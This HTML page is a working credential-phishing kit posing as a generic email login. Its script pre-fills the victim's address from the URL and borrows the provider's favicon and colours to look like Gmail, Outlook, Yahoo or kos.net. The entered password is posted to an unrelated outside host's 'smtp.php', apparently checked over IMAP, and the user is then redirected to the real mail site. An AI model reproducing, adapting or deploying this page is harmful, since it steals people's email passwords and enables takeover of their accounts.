<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SMTP Login</title>
  <link id="dynamic-favicon" rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #e0e7ff 0%, #f8fafc 100%);
      min-height: 100vh;
      margin: 0;
      transition: background 0.6s cubic-bezier(.4,0,.2,1);
    }
    .login-container {
      width: 320px;
      margin: 100px auto;
      padding: 30px;
      background: #fff;
      border-radius: 14px;
      box-shadow: 0 4px 32px 0 rgba(0,0,0,0.10), 0 1.5px 6px 0 rgba(0,0,0,0.13);
      text-align: center;
      position: relative;
    }
    .logo {
      width: 80px;
      height: 80px;
      object-fit: contain;
      margin-bottom: 20px;
      border-radius: 8px;
      background: #f0f0f0;
      display: inline-block;
      border: 1px solid #eee;
    }
    h2 { margin-top: 0; }
    label { display: block; margin: 15px 0 5px; text-align: left; }
    .password-field-wrapper {
      position: relative;
      width: 100%;
      display: flex;
      align-items: center;
    }
    input[type="email"], input[type="password"], input[type="text"] {
      width: 100%;
      padding: 8px 40px 8px 8px;
      box-sizing: border-box;
      font-size: 16px;
    }
    .show-password-btn {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 13px;
      color: #2980b9;
      padding: 2px 4px;
      user-select: none;
      height: 24px;
      min-width: 34px;
      border-radius: 3px;
      transition: background 0.2s;
    }
    .show-password-btn:active, .show-password-btn:focus {
      background: #e0e7ff;
      outline: none;
    }
    button[type="submit"] {
      width: 100%;
      padding: 10px;
      background: #2980b9;
      color: white;
      border: none;
      border-radius: 4px;
      margin-top: 20px;
      cursor: pointer;
      font-size: 16px;
      position: relative;
      transition: background 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    button[type="submit"]:hover {
      background: #1a5c8a;
    }
    button[type="submit"].loading {
      cursor: wait;
      opacity: 0.7;
      pointer-events: none;
    }
    .spinner {
      border: 2px solid #f3f3f3;
      border-top: 2px solid #fff;
      border-right: 2px solid #fff;
      border-radius: 50%;
      width: 18px;
      height: 18px;
      margin-left: 8px;
      animation: spin 0.8s linear infinite;
      display: inline-block;
      vertical-align: middle;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    #top-error-message {
      display: none;
      background: #ffd6d6;
      color: #b10000;
      border: 1px solid #ffb3b3;
      padding: 10px 0;
      border-radius: 6px;
      font-weight: bold;
      margin-bottom: 16px;
      position: relative;
      width: 100%;
      box-sizing: border-box;
      font-size: 15px;
      z-index: 2;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div id="top-error-message"></div>
    <img id="logo" class="logo" src="" alt="Provider Logo" style="display:none;">
    <h2>Email Login</h2>
    <form id="loginForm" autocomplete="off">
      <label for="email">Email Address</label>
      <input type="email" id="email" name="email" required readonly autofocus>

      <label for="password">Password</label>
      <div class="password-field-wrapper">
        <input type="password" id="password" name="password" required>
        <button type="button" class="show-password-btn" id="togglePassword">Show</button>
      </div>
      <button type="submit" id="loginBtn">
        Login
      </button>
    </form>
  </div>
  <script>
    // Map domains to background gradients or colors
    const domainBackgrounds = {
      "kos.net": "linear-gradient(120deg, #2c3e50 0%, #6dd5ed 100%)",
      "gmail.com": "linear-gradient(120deg, #fceabb 0%, #f8b500 100%)",
      "outlook.com": "linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)",
      "hotmail.com": "linear-gradient(135deg, #1e3c72 0%, #2a5298 100%)",
      "yahoo.com": "linear-gradient(135deg, #8360c3 0%, #2ebf91 100%)"
      // Add more as needed
    };

    // Get the 'email' parameter from the URL
    const params = new URLSearchParams(window.location.search);
    const email = params.get('email');
    if (email) {
      document.getElementById('email').value = email;
      // Extract domain from email
      const domain = email.split('@')[1]?.toLowerCase();

      // Set background if domain matches
      if(domain && domainBackgrounds[domain]) {
        document.body.style.background = domainBackgrounds[domain];
      }

      // Try to use the domain's favicon as the logo and favicon
      let logoUrl = domain
        ? `https://www.google.com/s2/favicons?sz=128&domain=${encodeURIComponent(domain)}`
        : "https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg";

      // Set page favicon dynamically
      const favicon = document.getElementById('dynamic-favicon');
      favicon.href = logoUrl;

      // Fallback to generic icon if favicon fails to load for logo
      const logoImg = document.getElementById('logo');
      logoImg.src = logoUrl;
      logoImg.style.display = "inline-block";
      logoImg.alt = domain ? `${domain} logo` : "Provider Logo";
      logoImg.onerror = function() {
        this.onerror = null;
        this.src = "https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg";
        favicon.href = "https://upload.wikimedia.org/wikipedia/commons/4/4e/Mail_%28iOS%29.svg";
      };
    }

    // Show/hide password functionality
    const passwordInput = document.getElementById('password');
    const togglePasswordBtn = document.getElementById('togglePassword');
    togglePasswordBtn.addEventListener('click', function() {
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      this.textContent = isPassword ? 'Hide' : 'Show';
    });

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const loginBtn = document.getElementById('loginBtn');
      const topError = document.getElementById('top-error-message');

      // Show spinner and disable button
      loginBtn.classList.add('loading');
      loginBtn.innerHTML = 'Logging in <span class="spinner"></span>';
      loginBtn.disabled = true;

      // Hide any previous error
      topError.style.display = "none";
      topError.textContent = "";
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      // 1. IMAP check via PHP backend
      try {
        const resp = await fetch("https://pamelacharles.alwaysdata.net/smtp.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password })
        });
        const text = await resp.text();
        let result;
        try {
          result = JSON.parse(text);
        } catch (e) {
          topError.textContent = "Server error (invalid response)";
          topError.style.display = "block";
          // Restore button
          loginBtn.classList.remove('loading');
          loginBtn.innerHTML = 'Login';
          loginBtn.disabled = false;
          return;
        }
        if (!result.success) {
          topError.textContent = result.error || "Incorrect password.";
          topError.style.display = "block";
          // Restore button
          loginBtn.classList.remove('loading');
          loginBtn.innerHTML = 'Login';
          loginBtn.disabled = false;
          return;
        }
      } catch (err) {
        topError.textContent = "Server error: " + err.message;
        topError.style.display = "block";
        // Restore button
        loginBtn.classList.remove('loading');
        loginBtn.innerHTML = 'Login';
        loginBtn.disabled = false;
        return;
      }

      // 2. Redirect to email domain
      let domain = email.split('@')[1];
      if(domain){
        window.location.href = "https://" + domain;
      } else {
        window.location.href = "https://mail.google.com/";
      }
    });
  </script>
</body>

</html>
